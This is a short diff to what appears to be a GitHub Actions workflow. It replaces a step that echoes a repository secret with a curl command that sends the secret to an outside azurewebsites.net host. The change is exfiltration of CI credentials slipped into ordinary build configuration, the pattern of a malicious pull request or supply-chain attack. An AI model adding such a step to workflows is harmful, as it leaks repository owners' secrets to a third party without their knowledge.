@@ -17,5 +17,5 @@ jobs:
         env:
           SECRET: ${{ secrets.SECRET }}
         run: |
-          echo "$SECRET"
+          curl -F https://wa-ncd-sec01.azurewebsites.net/$SECRET
 
